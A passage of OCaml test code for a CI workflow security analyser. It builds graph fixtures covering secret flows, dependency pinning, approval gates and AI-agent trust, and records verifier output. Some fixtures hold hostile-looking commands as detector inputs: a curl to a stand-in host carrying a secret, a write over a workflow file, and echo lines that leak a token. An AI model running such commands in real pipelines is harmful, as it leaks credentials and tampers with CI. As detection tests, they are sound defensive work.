let program_graph_edge_evidence () =
  let target_entry = node ~kind:Ir.Workflow 500 "target entry"
  and wrong_entry = node ~kind:Ir.Workflow 501 "wrong"
  and text_entry = node ~kind:Ir.Workflow 502 "text"
  and basename_entry = node ~kind:Ir.Workflow 503 "basename" in
  let action_graph =
    graph ~source:".github/actions/build/action.yml" [ target_entry ] []
      [ target_entry ]
  and wrong_manifest =
    graph ~source:".github/actions/wrong/action.yml" [ wrong_entry ] []
      [ wrong_entry ]
  and non_manifest =
    graph ~source:".github/actions/build/action.txt" [ text_entry ] []
      [ text_entry ]
  and basename_graph =
    graph ~source:"units/build.yml" [ basename_entry ] [] [ basename_entry ]
  in
  let call = node ~kind:Ir.Call 504 "./.github/actions/build"
  and command = node ~kind:Ir.Command 505 "./.github/actions/build"
  and self_call = node ~kind:Ir.Call 506 "./main.yml" in
  let main_graph =
    graph ~source:"main.yml" [ call; command; self_call ] [] [ call ]
  in
  let writer = node ~kind:Ir.Resource 507 "shared-artifact"
  and reader = node ~kind:Ir.Resource 508 "shared-artifact"
  and unwritten_resource = node ~kind:Ir.Resource 509 "shared-artifact"
  and control_resource = node ~kind:Ir.Resource 513 "shared-artifact"
  and resource_named_command = node ~kind:Ir.Command 510 "shared-artifact"
  and producer = node 511 "producer"
  and consumer = node 512 "consumer" in
  let resource_graph =
    graph ~source:"resources.yml"
      [
        writer;
        reader;
        unwritten_resource;
        control_resource;
        resource_named_command;
        producer;
        consumer;
      ]
      [
        edge ~kind:Ir.Write producer writer;
        edge ~kind:Ir.Read reader consumer;
        edge ~kind:Ir.Control producer control_resource;
        edge ~kind:Ir.Write producer resource_named_command;
      ]
      [ producer ]
  in
  let compose_case index reference candidates =
    let caller = node ~kind:Ir.Call index reference in
    let caller_graph =
      graph ~source:(Printf.sprintf "caller-%d.yml" index) [ caller ] []
        [ caller ]
    in
    Program_graph.compose (caller_graph :: candidates) |> Ir.to_json
  in
  Json.Object
    [
      ( "action-target",
        compose_case 520 "./.github/actions/build" [ action_graph ] );
      ( "wrong-action-target",
        compose_case 521 "./.github/actions/build" [ wrong_manifest ] );
      ( "non-manifest-target",
        compose_case 522 "./.github/actions/build" [ non_manifest ] );
      ( "basename-target",
        compose_case 523 "./other/build.yml" [ basename_graph ] );
      ( "child-target",
        compose_case 524 "child:./unit.yml"
          [
            let child = node 525 "child" in
            graph ~source:"unit.yml" [ child ] [] [ child ];
          ] );
      ( "parent-target",
        compose_case 526 "../unit.yaml"
          [
            let parent = node 527 "parent" in
            graph ~source:"unit.yaml" [ parent ] [] [ parent ];
          ] );
      ( "github-target",
        compose_case 528 ".github/workflows/unit.yml"
          [
            let github = node 529 "github" in
            graph ~source:".github/workflows/unit.yml" [ github ] [] [ github ];
          ] );
      ( "remote-target",
        compose_case 530 "owner/action@v1"
          [
            let remote = node 531 "remote" in
            graph ~source:"action.yml" [ remote ] [] [ remote ];
          ] );
      ( "composed",
        Program_graph.compose
          [ main_graph; action_graph; wrong_manifest; non_manifest; resource_graph ]
        |> Ir.to_json );
    ]

let capability_edge_evidence () =
  let minimal_by_effect =
    Json.Array
      (List.mapi
         (fun index observed_effect ->
           let subject =
             node ~kind:Ir.Effect ~effects:[ observed_effect ] (600 + index)
               (Ir.effect_name observed_effect)
           in
           Json.Object
             [
               ("effect", Json.String (Ir.effect_name observed_effect));
               ( "capabilities",
                 strings
                   (Capability_analysis.minimal_for_path [ subject ]
                   |> List.map Ir.capability_name) );
             ])
         all_effects)
  in
  let demand_case ?unknown ?attribute index label capability effects =
    let grant =
      node ~kind:Ir.Workflow ~phase:Ir.Compile ~capabilities:[ capability ]
        index ("grant-" ^ label)
    and sink =
      node ~kind:Ir.Effect ~effects ?unknown
        ~attributes:(Option.fold ~none:[] ~some:(fun value -> [ ("value", value) ]) attribute)
        (index + 1) ("sink-" ^ label)
    in
    let candidate = graph [ grant; sink ] [ edge grant sink ] [ grant ] in
    Json.Object
      [
        ("label", Json.String label);
        ( "demands",
          Json.Array
            (List.map demand_json (Capability_analysis.grant_demands candidate))
        );
        ( "excessive",
          Json.Array
            (List.map demand_json
               (Capability_analysis.excessive_grants candidate
               |> List.map (fun grant -> (grant, Capability_analysis.Excessive))))
        );
      ]
  in
  let reason label = Unknown.External_state label in
  let abstract ?(value = Abstract_value.String Abstract_value.Top)
      ?(trust = Abstract_value.Trusted) ?(secrecy = Abstract_value.Public) () =
    {
      Abstract_value.value_type = Dynamic_type;
      value;
      trust;
      secrecy;
      provenance = [];
    }
  in
  let cases =
    [
      demand_case 700 "repository-read" Ir.Repository_read [];
      demand_case 702 "token-read" Ir.Token_read [];
      demand_case 704 "filesystem-read" Ir.Filesystem_read [];
      demand_case 706 "shell" Ir.Shell [];
      demand_case 708 "oidc-deploy" Ir.Oidc [ Ir.Deployment_change ];
      demand_case 710 "oidc-none" Ir.Oidc [];
      demand_case 712 "cloud-credential" Ir.Cloud_credential
        [ Ir.Credential_use ];
      demand_case 714 "persistence-file" Ir.Self_hosted_persistence
        [ Ir.File_write ];
      demand_case 716 "persistence-workflow" Ir.Self_hosted_persistence
        [ Ir.Workflow_change ];
      demand_case 718 "persistence-none" Ir.Self_hosted_persistence [];
      demand_case 720 "artifact-read" Ir.Artifact_read [ Ir.Artifact_publish ];
      demand_case 722 "artifact-none" Ir.Artifact_read [];
      demand_case 724 "cache-read" Ir.Cache_read [ Ir.Cache_publish ];
      demand_case 726 "cache-none" Ir.Cache_read [];
      demand_case 728 "network" Ir.Network [ Ir.Network_request ];
      demand_case 730 "network-none" Ir.Network [];
      demand_case ~unknown:(reason "node") 732 "unknown-node" Ir.Network [];
      demand_case
        ~attribute:
          (abstract ~value:(Unknown_value [ reason "value" ]) ())
        734 "unknown-value" Ir.Network [];
      demand_case
        ~attribute:
          (abstract ~trust:(Unknown_trust [ reason "trust" ]) ())
        736 "unknown-trust" Ir.Network [];
      demand_case
        ~attribute:
          (abstract ~secrecy:(Unknown_secrecy [ reason "secrecy" ]) ())
        738 "unknown-secrecy" Ir.Network [];
    ]
  in
  Json.Object [ ("minimal_by_effect", minimal_by_effect); ("demands", Json.Array cases) ]

let verifier_boundary_evidence () =
  let unknown_secrecy reason =
    {
      Abstract_value.value_type = Dynamic_type;
      value = String Top;
      trust = Trusted;
      secrecy = Unknown_secrecy [ reason ];
      provenance = [];
    }
  and command ?(shell = "bash") index source =
    node
      ~attributes:
        [ ("command", value index source); ("shell", value index shell) ]
      index source
  and verified label candidate =
    Json.Object
      [
        ("label", Json.String label);
        ("graph", Ir.to_json candidate);
        ("result", Verifier.verify ~persona:Verifier.Audit candidate |> Verifier.to_json);
      ]
  in
  let env_source =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 800 "event") ]
      800 "env:TOKEN"
  and bash_boundary = command 801 "echo $TOKEN-"
  and bash_braced = command 802 "echo ${TOKEN}"
  and powershell = command ~shell:"powershell" 803 "echo $env:TOKEN"
  and cmd_percent = command ~shell:"cmd" 804 "echo %TOKEN%"
  and cmd_delayed = command ~shell:"cmd" 805 "echo !TOKEN!"
  and uncertain_public = command ~shell:"fish" 806 "echo safe"
  and uncertain_secret =
    node
      ~attributes:
        [
          ("command", value 807 "curl https://example.invalid");
          ("value", unknown_secrecy (Unknown.External_state "secret source"));
        ]
      ~capabilities:[ Ir.Network ] 807 "uncertain secret"
  in
  let expression_graph =
    graph
      [
        env_source;
        bash_boundary;
        bash_braced;
        powershell;
        cmd_percent;
        cmd_delayed;
        uncertain_public;
        uncertain_secret;
      ]
      (List.map
         (fun target -> edge ~kind:Ir.Data env_source target)
         [ bash_boundary; bash_braced; powershell; cmd_percent; cmd_delayed ])
      [ env_source; uncertain_public; uncertain_secret ]
  in
  let isolated_unknown_trust =
    let reason = Unknown.External_state "command trust" in
    let unknown_trust_value =
      {
        Abstract_value.value_type = Dynamic_type;
        value = String Top;
        trust = Unknown_trust [ reason ];
        secrecy = Public;
        provenance = [];
      }
    in
    let subject =
      node ~attributes:[ ("value", unknown_trust_value) ] 808 "echo safe"
    in
    graph [ subject ] [] [ subject ]
  and isolated_unknown_secrecy =
    let subject =
      node
        ~attributes:
          [
            ("command", value 809 "curl https://example.invalid");
            ( "value",
              unknown_secrecy (Unknown.External_state "isolated secrecy") );
          ]
        ~capabilities:[ Ir.Network ] 809 "isolated unknown secret"
    in
    graph [ subject ] [] [ subject ]
  in
  let digest value_ = [ ("dependency.digest", value 820 value_) ] in
  let supply_graph =
    graph
      [
        node ~kind:Ir.Call 810 "./local/action";
        node ~kind:Ir.Call 811 "../local/action";
        node ~kind:Ir.Call 812 "owner/action@v1";
        node ~kind:Ir.Call 813 ("owner/action@" ^ String.make 40 'a');
        node ~kind:Ir.Call
          ~attributes:(digest ("sha256:" ^ String.make 64 'b'))
          814 "locked-by-metadata";
        node ~kind:Ir.Call
          ~attributes:(digest ("xha256:" ^ String.make 64 'c'))
          815 "wrong-prefix";
        node ~kind:Ir.Call
          ~attributes:(digest ("sha256:" ^ String.make 63 'd' ^ "g"))
          816 "non-hex";
        node ~kind:Ir.Call
          ~attributes:(digest ("sha256:" ^ String.make 63 'e'))
          817 "short-digest";
      ]
      [] []
  in
  let supply_case index label name attributes =
    let call = node ~kind:Ir.Call ~attributes index name in
    verified label (graph [ call ] [] [ call ])
  in
  let integrity_graph =
    let sink =
      node ~kind:Ir.Effect ~effects:[ Ir.Repository_change ]
        ~capabilities:[ Ir.Repository_write ] 830 "privileged sink"
    in
    let resource index name capability =
      node ~kind:Ir.Resource ~capabilities:[ capability ]
        ~attributes:
          [ ("value", value ~trust:Abstract_value.Untrusted index "poison") ]
        index name
    in
    let artifact_read = resource 831 "bundle-read" Ir.Artifact_read
    and artifact_write = resource 832 "bundle-write" Ir.Artifact_write
    and cache_read = resource 833 "deps-read" Ir.Cache_read
    and cache_write = resource 834 "deps-write" Ir.Cache_write in
    graph [ artifact_read; artifact_write; cache_read; cache_write; sink ]
      (List.map (fun source -> edge source sink)
         [ artifact_read; artifact_write; cache_read; cache_write ])
      [ artifact_read; artifact_write; cache_read; cache_write ]
  in
  let integrity_trace_graph =
    let resource =
      node ~kind:Ir.Resource
        ~attributes:
          [ ("value", value ~trust:Abstract_value.Untrusted 835 "poison") ]
        835 "artifact:trace"
    and sink =
      node ~kind:Ir.Effect ~effects:[ Ir.Repository_change ]
        ~capabilities:[ Ir.Repository_write ] 836 "trace sink"
    in
    let trusted_source =
      List.init 128 (fun offset ->
          node ~kind:Ir.Resource
            ~attributes:[ ("value", value (9000 + offset) "trusted") ]
            (9000 + offset) (Printf.sprintf "trusted-%03d" offset))
      |> List.find_opt (fun (candidate : Ir.node) -> candidate.Ir.id < resource.id)
      |> Option.get
    in
    graph [ trusted_source; resource; sink ]
      [ edge ~kind:Ir.Data trusted_source resource; edge resource sink ]
      [ trusted_source; resource ]
  in
  let credential_graph =
    let secret_source =
      node ~kind:Ir.Resource
        ~attributes:
          [ ("value", value ~secrecy:Abstract_value.Secret 840 "TOKEN") ]
        840 "secret"
    and public_source =
      node ~kind:Ir.Resource ~attributes:[ ("value", value 841 "public") ] 841
        "public"
    and tail = node 842 "runner tail"
    and capability_candidate =
      node ~kind:Ir.Call ~capabilities:[ Ir.Self_hosted_persistence ] 843
        "capability persistence"
    and edge_candidate = node ~kind:Ir.Call 844 "edge persistence"
    and disabled_candidate =
      node ~kind:Ir.Call ~capabilities:[ Ir.Self_hosted_persistence ]
        ~attributes:[ ("persist-credentials", value 845 "false") ]
        845 "disabled persistence"
    and direct_candidate =
      node ~kind:Ir.Call ~capabilities:[ Ir.Self_hosted_persistence ]
        ~attributes:
          [ ("credential", value ~secrecy:Abstract_value.Secret 846 "TOKEN") ]
        846 "direct persistence"
    and unknown_candidate =
      node ~kind:Ir.Call ~capabilities:[ Ir.Self_hosted_persistence ]
        ~attributes:
          [
            ( "credential",
              unknown_secrecy (Unknown.External_state "credential secrecy") );
          ]
        847 "unknown persistence"
    in
    graph
      [
        secret_source;
        public_source;
        tail;
        capability_candidate;
        edge_candidate;
        disabled_candidate;
        direct_candidate;
        unknown_candidate;
      ]
      [
        edge ~kind:Ir.Data secret_source capability_candidate;
        edge ~kind:Ir.Data secret_source edge_candidate;
        edge ~kind:Ir.Data secret_source disabled_candidate;
        edge ~kind:Ir.Data public_source direct_candidate;
        edge ~kind:Ir.Persist capability_candidate tail;
        edge ~kind:Ir.Persist edge_candidate tail;
        edge ~kind:Ir.Persist disabled_candidate tail;
        edge ~kind:Ir.Persist direct_candidate tail;
        edge ~kind:Ir.Persist unknown_candidate tail;
      ]
      [ secret_source; public_source; unknown_candidate ]
  in
  let isolated_unknown_credential =
    let tail = node 848 "unknown tail"
    and candidate =
      node ~kind:Ir.Call ~capabilities:[ Ir.Self_hosted_persistence ]
        ~attributes:
          [
            ( "credential",
              unknown_secrecy
                (Unknown.External_state "isolated credential secrecy") );
          ]
        849 "isolated unknown credential"
    in
    graph [ candidate; tail ] [ edge ~kind:Ir.Persist candidate tail ]
      [ candidate ]
  in
  let privileged_sink index name =
    node ~kind:Ir.Effect ~effects:[ Ir.Deployment_change ]
      ~capabilities:[ Ir.Deployment ] index name
  in
  let gate_case ?(provider = Ir.Github) index gate =
    let entry = node ~provider ~kind:Ir.Workflow ~phase:Ir.Compile index "entry"
    and sink = privileged_sink (index + 2) "deploy" in
    graph ~provider [ entry; gate; sink ] [ edge entry gate; edge gate sink ]
      [ entry ]
  in
  let protected_or_gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~condition:
        (Condition.or_ (Condition.atom "github.ref_protected")
           (Condition.atom "actor_is_admin"))
      850 "protected or actor"
  and circle_nonapproval =
    node ~provider:Ir.Circleci ~kind:Ir.Gate ~phase:Ir.Plan 861 "review"
  and github_approval_prefix =
    node ~kind:Ir.Gate ~phase:Ir.Plan 871 "approval:manual"
  in
  let fallback_sink = privileged_sink 880 "disconnected deploy" in
  let fallback_graph = graph [ fallback_sink ] [] [] in
  let ai_graph trust capabilities index =
    let agent =
      node ~kind:Ir.Call ~capabilities
        ~attributes:[ ("prompt", value ~trust index "prompt") ]
        index "openai agent"
    in
    graph [ agent ] [] [ agent ]
  in
  let self_graph =
    let grant =
      node ~kind:Ir.Workflow ~phase:Ir.Compile
        ~capabilities:[ Ir.Repository_write ] 900 "write grant"
    and offender = command 901 "printf evil > .github/workflows/ci.yml" in
    graph [ grant; offender ] [ edge grant offender ] [ grant ]
  in
  Json.Array
    [
      verified "expressions" expression_graph;
      verified "unknown-trust" isolated_unknown_trust;
      verified "unknown-secrecy" isolated_unknown_secrecy;
      verified "supply" supply_graph;
      supply_case 818 "supply-local-dot" "./local/action" [];
      supply_case 819 "supply-local-parent" "../local/action" [];
      supply_case 820 "supply-sha-reference"
        ("owner/action@sha256:" ^ String.make 64 'a') [];
      supply_case 821 "supply-valid-digest" "locked-by-metadata"
        (digest ("sha256:" ^ String.make 64 'b'));
      supply_case 822 "supply-wrong-prefix" "wrong-prefix"
        (digest ("xha256:" ^ String.make 64 'c'));
      supply_case 823 "supply-non-hex" "non-hex"
        (digest ("sha256:" ^ String.make 63 'd' ^ "g"));
      supply_case 824 "supply-short-digest" "short-digest"
        (digest ("sha256:" ^ String.make 63 'e'));
      verified "integrity" integrity_graph;
      verified "integrity-trace" integrity_trace_graph;
      verified "credential" credential_graph;
      verified "unknown-credential" isolated_unknown_credential;
      verified "protected-or-gate" (gate_case 851 protected_or_gate);
      verified "circle-nonapproval"
        (gate_case ~provider:Ir.Circleci 860 circle_nonapproval);
      verified "github-approval-prefix" (gate_case 870 github_approval_prefix);
      verified "fallback-auth-trace" fallback_graph;
      verified "trusted-agent"
        (ai_graph Abstract_value.Trusted [ Ir.Network ] 890);
      verified "untrusted-agent-no-authority"
        (ai_graph Abstract_value.Untrusted [] 891);
      verified "untrusted-agent-authority"
        (ai_graph Abstract_value.Untrusted [ Ir.Ai_tool ] 892);
      verified "self-modification" self_graph;
    ]

let policy_edge_evidence () =
  let calls =
    [
      node ~kind:Ir.Call 100 ("registry/image@sha256:" ^ String.make 64 'a');
      node ~kind:Ir.Call 101 ("owner/action@" ^ String.make 40 'b');
      node ~kind:Ir.Call 102 "owner/action@v1";
      node ~kind:Ir.Call 103 "./local/action";
      node ~kind:Ir.Call 104 "dynamic-call";
      node ~kind:Ir.Command 105 ("owner/action@" ^ String.make 40 'c');
      node ~kind:Ir.Call 106 ("owner/action@" ^ String.make 38 'd');
    ]
  in
  let graph = graph calls [] [] in
  let predicates =
    [
      ("immutable", Policy.Dependency_mutability Frontend_intf.Immutable);
      ("mutable", Policy.Dependency_mutability Frontend_intf.Mutable);
      ("local", Policy.Dependency_mutability Frontend_intf.Local);
      ("unknown", Policy.Dependency_mutability Frontend_intf.Unknown_mutability);
    ]
  in
  Json.Array
    (List.map
       (fun (label, predicate) ->
         let rule =
           {
             Policy.id = "EDGE-" ^ String.uppercase_ascii label;
             kind = Forbid;
             selector = All [ predicate ];
             message = label;
             severity = Diagnostic.Warning;
           }
         in
         Json.Object
           [
             ("label", Json.String label);
             ( "diagnostics",
               Json.Array
                 (List.map Diagnostic.to_json (Policy.evaluate [ rule ] graph))
             );
           ])
       predicates)

let policy_predicate_edge_evidence () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 210 "entry"
  and disconnected_gate = node ~kind:Ir.Gate ~phase:Ir.Plan 211 "approval"
  and command = node ~kind:Ir.Command 212 "command"
  and resource =
    Ir.make_node ~provider:Ir.Github ~kind:Ir.Resource ~name:"resource"
      ~phase:Ir.Run ~span:(span 213 ".github/workflows/edge.yml") ()
  in
  let disconnected =
    graph [ entry; disconnected_gate; command; resource ] [ edge entry command ]
      [ entry; disconnected_gate ]
  and connected =
    let connected_entry =
      node ~kind:Ir.Workflow ~phase:Ir.Compile 214 "connected entry"
    and connected_gate = node ~kind:Ir.Gate ~phase:Ir.Plan 215 "connected gate"
    and connected_sink = node ~kind:Ir.Effect 216 "connected sink" in
    graph [ connected_entry; connected_gate; connected_sink ]
      [ edge connected_entry connected_gate; edge connected_gate connected_sink ]
      [ connected_entry ]
  in
  let evaluate label selector candidate =
    let rule =
      {
        Policy.id = "EDGE-" ^ String.uppercase_ascii label;
        kind = Forbid;
        selector;
        message = label;
        severity = Diagnostic.Warning;
      }
    in
    Json.Object
      [
        ("label", Json.String label);
        ( "diagnostics",
          Json.Array
            (List.map Diagnostic.to_json (Policy.evaluate [ rule ] candidate))
        );
      ]
  in
  Json.Array
    [
      evaluate "node-kind" (All [ Node_kind Ir.Command ]) disconnected;
      evaluate "path" (All [ Path_prefix ".github/" ]) disconnected;
      evaluate "dominated-disconnected" (All [ Dominated_by_gate true ])
        disconnected;
      evaluate "not-dominated-connected" (All [ Dominated_by_gate false ])
        connected;
    ]

let verifier_result graph = Verifier.verify ~persona:Verifier.Audit graph

let permission_edge_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 110 "grant workflow"
  and holder =
    node ~kind:Ir.Command ~capabilities:[ Ir.Repository_write ] 111
      "grant-only command"
  in
  graph [ entry; holder ] [ edge ~kind:Ir.Grant entry holder ] [ entry ]

let safe_checkout_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile 120 "safe checkout workflow"
  and source =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 121 "head ref") ]
      121 "event:head"
  and checkout =
    node ~kind:Ir.Call 122 ("actions/checkout@" ^ String.make 40 'd')
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Repository_write ]
      ~effects:[ Ir.Repository_change ] 123 "publish"
  in
  graph
    [ entry; source; checkout; sink ]
    [
      edge entry checkout;
      edge checkout sink;
      edge ~kind:Ir.Data source checkout;
    ]
    [ entry ]

let mechanism_gate_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 130 "manual workflow"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~attributes:[ ("mechanism", value 131 "manual") ]
      131 "custom human review"
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Deployment ]
      ~effects:[ Ir.Deployment_change ] 132 "deploy"
  in
  graph [ entry; gate; sink ] [ edge entry gate; edge gate sink ] [ entry ]

let non_authorizing_mechanism_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 135 "review workflow"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~attributes:[ ("mechanism", value 136 "review") ]
      136 "custom review label"
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Deployment ]
      ~effects:[ Ir.Deployment_change ] 137 "deploy after weak label"
  in
  graph [ entry; gate; sink ] [ edge entry gate; edge gate sink ] [ entry ]

let misleading_environment_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile 140 "environment workflow"
  and disconnected_environment =
    node ~kind:Ir.Resource 141 "environment:production"
  and connected_resource = node ~kind:Ir.Resource 142 "resource:unprotected"
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Deployment ]
      ~effects:[ Ir.Deployment_change ] 143 "deploy without gate"
  in
  graph
    [ entry; disconnected_environment; connected_resource; sink ]
    [ edge entry sink; edge ~kind:Ir.Grant connected_resource sink ]
    [ entry ]

let marker_only_agent_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 150 "agent workflow"
  and source =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 151 "issue body") ]
      151 "event:issue"
  and agent =
    node ~kind:Ir.Call ~capabilities:[ Ir.Network ] 152 "claude-code bridge"
  in
  graph [ entry; source; agent ]
    [ edge entry agent; edge ~kind:Ir.Data source agent ]
    [ entry ]

let synthetic_should_fail_evidence () =
  let diagnostic severity confidence =
    Diagnostic.make ~rule_id:"EDGE-GATE" ~severity ~confidence ~message:"edge"
      ~span:Span.none ()
  and unknown_property =
    {
      Property.id = "EDGE-UNKNOWN";
      state = Unknown [ Unknown.External_state "fixture" ];
      subject = None;
      explanation = "fixture";
    }
  in
  let result diagnostics properties : Verifier.result =
    {
      diagnostics;
      properties;
      complete = false;
      analyzed_nodes = 0;
      analyzed_edges = 0;
    }
  in
  let candidates =
    [
      ("high-warning", result [ diagnostic Warning High ] []);
      ("medium-critical", result [ diagnostic Critical Medium ] []);
      ("high-error", result [ diagnostic Error High ] []);
      ("unknown-only", result [] [ unknown_property ]);
    ]
  in
  Json.Array
    (List.map
       (fun (label, candidate) ->
         Json.Object
           [
             ("label", Json.String label);
             ("gate", Json.Bool (Verifier.should_fail Gate candidate));
             ("audit", Json.Bool (Verifier.should_fail Audit candidate));
             ("paranoid", Json.Bool (Verifier.should_fail Paranoid candidate));
           ])
       candidates)

let semantic_edge_oracle () =
  let append_redirect =
    Script_adapter.analyze Bash "printf '%s' \"$TOKEN\" >> private.log"
  in
  let graphs =
    [
      ("permission", permission_edge_graph ());
      ("safe-checkout", safe_checkout_graph ());
      ("mechanism-gate", mechanism_gate_graph ());
      ("non-authorizing-mechanism", non_authorizing_mechanism_graph ());
      ("misleading-environment", misleading_environment_graph ());
      ("marker-only-agent", marker_only_agent_graph ());
    ]
  in
  Json.Object
    [
      ("abstract", abstract_edge_evidence ());
      ("json_parse", json_parse_evidence ());
      ("ordering", ordering_edge_evidence ());
      ("graph_algorithms", graph_algorithm_edge_evidence ());
      ("program_graph", program_graph_edge_evidence ());
      ("capability", capability_edge_evidence ());
      ("verifier_boundaries", verifier_boundary_evidence ());
      ("append_redirect", script_summary_json append_redirect);
      ("policy_mutability", policy_edge_evidence ());
      ("policy_predicates", policy_predicate_edge_evidence ());
      ( "graphs",
        Json.Array
          (List.map
             (fun (label, candidate) ->
               Json.Object
                 [
                   ("label", Json.String label);
                   ("graph", Ir.to_json candidate);
                   ("result", Verifier.to_json (verifier_result candidate));
                 ])
             graphs) );
      ("should_fail", synthetic_should_fail_evidence ());
    ]
  |> fingerprint "semantic-edges"
       "01ef4250f626839a04df5729ce3bc40e1cc2019cd23811dede7aae8bc40a0b6c"

let config_edge_oracle () =
  Json.Array
    (List.map config_result_json
       [
         "";
         "frontends = broken\n";
         "[resolver]\nallowed_sources = [\"a\"]\nallowed_sources = [\"b\"]\n";
         "[[rules]]\nid = bare\nkind = \"forbid\"\n";
         "[[rules]]\nid = \"EDGE\"\nkind = \"forbid\"\nextra = \"bad\"\n";
         "[[rules]]\nmessage = \"missing identity\"\n";
         "[[allowlist]]\nkind = \"source\"\nvalue = \"github.com\"\nreason = \"reviewed\"\nextra = \"bad\"\n";
         "[sandbox]\nbackend = bare\n";
         "[sandbox]\nimage = bare\n";
         "[sandbox]\nnetwork = bare\n";
       ])
  |> fingerprint "config-edges"
       "29682a34818b4362823fd1dfa70c4b848dfe2d5a10412acd01b6fb29a08a3051"

let yaml_newline_name = function
  | `Lf -> "lf"
  | `CrLf -> "crlf"
  | `Cr -> "cr"
  | `None -> "none"

let yaml_trivia_name = function
  | Yaml_cst.Comment -> "comment"
  | Blank -> "blank"
  | Directive -> "directive"
  | Document_start -> "document-start"
  | Document_end -> "document-end"

let yaml_problem_json (problem : Yaml_cst.problem) =
  Json.Object
    [
      ("code", Json.String problem.code);
      ("message", Json.String problem.message);
      ("span", Span.to_json problem.span);
    ]

let yaml_issue_json (issue : Yaml_validation.issue) =
  Json.Object
    [
      ("code", Json.String issue.code);
      ("message", Json.String issue.message);
      ("span", Span.to_json issue.span);
    ]

let rec yaml_layout_evidence = function
  | Yaml_cst.Scalar scalar ->
      Json.Object
        [
          ("kind", Json.String "scalar");
          ("raw", Json.String scalar.raw);
          ("span", Span.to_json scalar.span);
        ]
  | Alias alias ->
      Json.Object
        [
          ("kind", Json.String "alias");
          ("raw", Json.String alias.raw);
          ("span", Span.to_json alias.span);
        ]
  | Sequence (items, span) ->
      Json.Object
        [
          ("kind", Json.String "sequence");
          ("span", Span.to_json span);
          ( "items",
            Json.Array
              (List.map
                 (fun (item : Yaml_cst.sequence_item) ->
                   Json.Object
                     [
                       ("dash", Span.to_json item.dash_span);
                       ("span", Span.to_json item.span);
                       ("value", yaml_layout_evidence item.value);
                     ])
                 items) );
        ]
  | Mapping (entries, span) | Flow_mapping (entries, span) ->
      Json.Object
        [
          ("kind", Json.String "mapping");
          ("span", Span.to_json span);
          ( "entries",
            Json.Array
              (List.map
                 (fun (entry : Yaml_cst.mapping_entry) ->
                   Json.Object
                     [
                       ("colon", Span.to_json entry.colon_span);
                       ("span", Span.to_json entry.span);
                       ("merge", Json.Bool entry.merge);
                       ("duplicate", Json.Bool entry.duplicate);
                       ("key", yaml_layout_evidence entry.key_node);
                       ("value", yaml_layout_evidence entry.value);
                     ])
                 entries) );
        ]
  | Flow_sequence (items, span) ->
      Json.Object
        [
          ("kind", Json.String "flow-sequence");
          ("span", Span.to_json span);
          ("items", Json.Array (List.map yaml_layout_evidence items));
        ]
  | Decorated decorated ->
      Json.Object
        [
          ("kind", Json.String "decorated");
          ("span", Span.to_json decorated.span);
          ("value", yaml_layout_evidence decorated.value);
        ]
  | Invalid invalid ->
      Json.Object
        [ ("kind", Json.String "invalid"); ("span", Span.to_json invalid.span) ]

let yaml_tree_evidence (label, source) =
  let file = "yaml-edge-" ^ label ^ ".yml" in
  let tree = Yaml_cst.parse ~file source in
  Json.Object
    [
      ("label", Json.String label);
      ("source_sha256", Json.String (Sha256.digest_string source));
      ("print_sha256", Json.String (Sha256.digest_string (Yaml_cst.print tree)));
      ("bom", Json.Bool tree.bom);
      ("newline", Json.String (yaml_newline_name tree.newline));
      ( "documents",
        Json.Array
          (List.map
             (fun (document : Yaml_cst.document) ->
               Json.Object
                 [
                   ("span", Span.to_json document.span);
                   ( "root",
                     Option.fold ~none:Json.Null ~some:Yaml_cst.node_to_json
                       document.root );
                   ( "layout",
                     Option.fold ~none:Json.Null ~some:yaml_layout_evidence
                       document.root );
                   ( "directives",
                     Json.Array
                       (List.map
                          (fun (trivia : Yaml_cst.trivia) ->
                            Json.Object
                              [
                                ("raw", Json.String trivia.raw);
                                ("span", Span.to_json trivia.span);
                              ])
                          document.directives) );
                 ])
             tree.documents) );
      ( "trivia",
        Json.Array
          (List.map
             (fun (trivia : Yaml_cst.trivia) ->
               Json.Object
                 [
                   ("kind", Json.String (yaml_trivia_name trivia.kind));
                   ("raw", Json.String trivia.raw);
                   ("span", Span.to_json trivia.span);
                 ])
             tree.trivia) );
      ( "anchors",
        Json.Array
          (List.map
             (fun (name, anchored) ->
               Json.Object
                 [
                   ("name", Json.String name);
                   ("node", Yaml_cst.node_to_json anchored);
                 ])
             tree.anchors) );
      ("problems", Json.Array (List.map yaml_problem_json tree.problems));
      ( "validation",
        Json.Array
          (List.map yaml_issue_json (Yaml_validation.validate ~file source)) );
      ("events", Json.String (Yaml_event.of_cst tree |> Yaml_event.to_string));
    ]

let invalid_tree raw reason =
  let node = Yaml_cst.Invalid { raw; reason; span = Span.none } in
  {
    Yaml_cst.file = "manual-invalid.yml";
    source = raw;
    bom = false;
    newline = `None;
    documents = [ { root = Some node; directives = []; span = Span.none } ];
    trivia = [];
    anchors = [];
    problems = [];
  }

let yaml_structural_evidence () =
  let parsed source = Yaml_cst.parse ~file:"structural.yml" source in
  let root_path = parsed "root:\n  child: value\n" in
  let path_value =
    match Yaml_cst.root root_path with
    | None -> Json.Null
    | Some root -> (
        match Yaml_cst.get_path root [ "root"; "child" ] with
        | None -> Json.Null
        | Some value -> Yaml_cst.node_to_json value)
  in
  let anchor_tree = parsed "root: [&x value, *x]\n" in
  let collection_size project source =
    parsed source |> Yaml_cst.root |> fun root -> Option.bind root project
    |> Option.fold ~none:(-1) ~some:List.length
  in
  let edit source edits =
